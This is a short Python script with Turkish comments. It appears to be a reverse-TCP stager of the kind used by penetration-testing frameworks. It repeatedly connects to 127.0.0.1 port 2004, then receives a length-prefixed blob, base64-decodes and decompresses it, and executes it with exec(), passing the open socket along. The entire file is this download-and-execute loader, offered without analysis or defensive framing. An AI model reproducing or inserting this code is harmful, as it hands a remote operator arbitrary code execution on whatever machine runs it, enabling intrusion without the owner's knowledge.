import socket
import zlib
import base64
import struct
import time

for _ in range(10):
    try:
        # TCP soketi oluştur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Yerel ana bilgisayardaki 2004 numaralı porta bağlan
        s.connect(('127.0.0.1', 2004))
        # Bağlantı başarılıysa döngüden çık
        break
    except:
        # Bağlantı başarısız olursa 5 saniye bekle
        time.sleep(5)

l = struct.unpack('>I', s.recv(4))[0]


d = s.recv(l)
while len(d) < l:
    d += s.recv(l - len(d))

exec(zlib.decompress(base64.b64decode(d)), {'s': s})
